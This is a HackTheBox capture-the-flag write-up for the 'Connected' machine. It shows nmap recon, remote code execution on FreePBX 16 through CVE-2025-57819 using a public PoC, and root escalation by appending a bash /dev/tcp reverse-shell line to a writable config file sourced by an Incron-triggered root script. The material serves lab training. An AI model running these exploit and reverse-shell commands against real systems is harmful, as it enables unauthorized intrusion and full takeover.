---
title: HTB · Connected
slug: htb-connected
date: 2026-08-11
image: connected
platform: HackTheBox
os: Linux
difficulty: Easy
points: 585
tags: [hackthebox, linux, easy, active, cve-2025-57819, reverse-shell, sql-injection, freepbx]
description: FreePBX 16 was exploited through CVE-2025-57819 to gain remote code execution, obtain a shell as the asterisk user, and escalate privileges to root through a misconfigured Incron-triggered service.
featured: true
---


---
layout: htb
title: "Connected"
subtitle: "HackTheBox Writeup"
date: 2026-07-29
machine_image: /assets/images/htb-connected.png
os: Linux
difficulty: Easy
xp: 585
release_date: "21 May, 2026"
tags: ["hackthebox", "linux", "easy", "active", "reverse-shell", "sql-injection", "freepbx"]
---

# Reconnaissance
## Staged Nmap Scanning
```bash
nmap -p- --min-rate 10000 10.129.245.100
nmap -p 22,80,443 -sCV 10.129.230.181
```
### Initial Scan Results
```bash
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-robots.txt: 1 disallowed entry 
|_/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
```
## Hosts File
The website uses a virtual host. I'll add it to `/etc/hosts`:
```bash
echo "10.129.245.100 connected.htb" | sudo tee -a /etc/hosts
```
---
# Exploitation
## Identifying the Target Application
The web interface revealed FreePBX version 16.0.40.7. I'll check whether the identified version is vulnerable to any publicly disclosed issues.
A little bit of research revealed [CVE-2025-57819](https://nvd.nist.gov/vuln/detail/cve-2025-57819), an unauthenticated SQL injection vulnerability affecting the Endpoint Manager component.
## RCE
After a little bit more research i found this [POC](https://github.com/K3ysTr0K3R/CVE-2025-57819) with a python script.
First run a listener:
```bash
nc -lnvp 9001
```
Then execute the exploit command.
```bash
python3 exploit.py -u http://connected.htb/ --lhost 10.10.17.36 --lport 9001
```
And we got a shell, as simple as that.
All we got to do now is print out the user.txt flag.
```bash
cat user.txt
```
---
# Post-Exploitation Enumeration
A quick search for writable files under /etc produced several interesting results.

`find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20`

Among the results was:
`/etc/dahdi/init.conf`

Writable configuration files should always be investigated because they are frequently processed by privileged services.

---
## Discovering the Root Trigger
Further enumeration revealed an Incron configuration.
```bash
cat /etc/incron.d/*`
```

The output showed:
```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Incron monitors filesystem events and automatically executes commands when changes occur. In this case, modifying a specific file caused a root-owned script to execute.
The next step was understanding what that script actually did.
Analysis revealed that the script sourced the writable file:
`/etc/dahdi/init.conf`

This immediately presented a privilege escalation opportunity.

---
# Privilege Escalation
Because the writable configuration file was executed by a root-owned process, arbitrary commands could be injected.
I'll append a reverse shell payload to the configuration file.
```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.17.36/7777 0>&1" &' >> /etc/dahdi/init.conf
```
And start a second listener
```bash
nc -lnvp 7777
```
Ill trigger the monitored file event like so:
```bash
`echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart`
```
And within seconds we got a new connection and we are root.
Let's just print out the root flag.
```bash
cat /root/root.txt
```
# References
- [CVE-2025-57819](https://nvd.nist.gov/vuln/detail/cve-2025-57819)
- [GitHub POC](https://github.com/K3ysTr0K3R/CVE-2025-57819)
- [HackTheBox - Connected](https://app.hackthebox.com/machines/Connected)
